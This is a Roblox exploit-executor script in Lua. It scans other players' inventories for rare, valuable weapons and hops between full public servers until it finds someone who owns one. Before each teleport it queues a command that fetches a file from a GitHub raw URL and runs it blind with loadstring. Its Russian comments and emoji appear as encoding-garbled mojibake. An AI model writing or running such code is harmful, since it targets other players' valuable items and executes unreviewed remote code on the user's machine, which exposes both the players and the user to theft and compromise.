local ItemDB = require(game:GetService("ReplicatedStorage").Database.Sync.Item)
local Players = game:GetService("Players")
local Http = game:GetService("HttpService")
local preferably = {
    "ZombieBat", "Makeshift", "TravelerGun", "TreeGun2023Chroma", "Harvester", "Gingerscope", "TravelerAxe", "Celestial", "Icepiercer"
}

local function CheckInventoryForPlayer(player)
    local success, data = pcall(function()
        return game.ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(player)
    end)
    if success and data and data.Weapons and data.Weapons.Owned then
        local ownedItems = data.Weapons.Owned
        local foundItems = {}

        for _, itemName in ipairs(preferably) do
            if ownedItems[itemName] then
                table.insert(foundItems, itemName)
            end
        end
        if #foundItems > 0 then
            print("‚úÖ Found preferred items for player " .. player.Name)
            print("Items: " .. table.concat(foundItems, ", "))
            return true
        else
            print("‚ùå No preferred items found for player " .. player.Name)
        end
    else
        print("‚ùå Failed to get data for " .. player.Name)
    end
    return false
end

local function teleportToNewServer()
    local Api = "https://games.roblox.com/v1/games/"
    local PlaceId = game.PlaceId
    local ServersApi = Api .. PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"

    local function ListServers(cursor)
        local url = ServersApi .. ((cursor and "&cursor=" .. cursor) or "")
        local response = game:HttpGet(url)
        return Http:JSONDecode(response)
    end

    local serverFound, nextCursor
    repeat
        local data = ListServers(nextCursor)
        -- –§–∏–ª—å—Ç—Ä–∞—Ü–∏—è —Å–µ—Ä–≤–µ—Ä–æ–≤, —á—Ç–æ–±—ã —Å–µ—Ä–≤–µ—Ä –±—ã–ª –ø–æ–ª–Ω—ã–º (–º–∏–Ω–∏–º—É–º 8 —á–µ–ª–æ–≤–µ–∫)
        for _, server in ipairs(data.data) do
            if server.playing >= 8 then  -- –ü—Ä–æ–≤–µ—Ä–∫–∞, —á—Ç–æ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ —Ö–æ—Ç—è –±—ã 8 –∏–≥—Ä–æ–∫–æ–≤
                serverFound = server
                break
            end
        end
        nextCursor = data.nextPageCursor
    until serverFound

    queue_on_teleport([[
wait(10)
loadstring(game:HttpGet('https://raw.githubusercontent.com/ipadys/empheriumf/refs/heads/main/f.txt'))()
    ]])
    game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceId, serverFound.id, Players.LocalPlayer)
end

local isTeleporting = false

function KeepCheckingForValidPlayer()
    for _, player in ipairs(Players:GetPlayers()) do
        print("üéÆ Checking " .. player.Name)
        if CheckInventoryForPlayer(player) then
            print("üéâ Found a valid player!")
            return true  -- –í–æ–∑–≤—Ä–∞—â–∞–µ–º true, –µ—Å–ª–∏ –∏–≥—Ä–æ–∫ –Ω–∞–π–¥–µ–Ω
        end
    end

    if not isTeleporting then
        isTeleporting = true
        print("üîÅ No matches found, teleporting...")
        teleportToNewServer()
    end
    return false  -- –ï—Å–ª–∏ –∏–≥—Ä–æ–∫ –Ω–µ –Ω–∞–π–¥–µ–Ω
end

-- –ì–ª–∞–≤–Ω—ã–π —Ü–∏–∫–ª —Å break
while true do
    if KeepCheckingForValidPlayer() then
        break  -- –ü—Ä–µ—Ä—ã–≤–∞–µ–º —Ü–∏–∫–ª, –µ—Å–ª–∏ –ø–æ–¥—Ö–æ–¥—è—â–∏–π –∏–≥—Ä–æ–∫ –Ω–∞–π–¥–µ–Ω
    end
    wait(10)
end
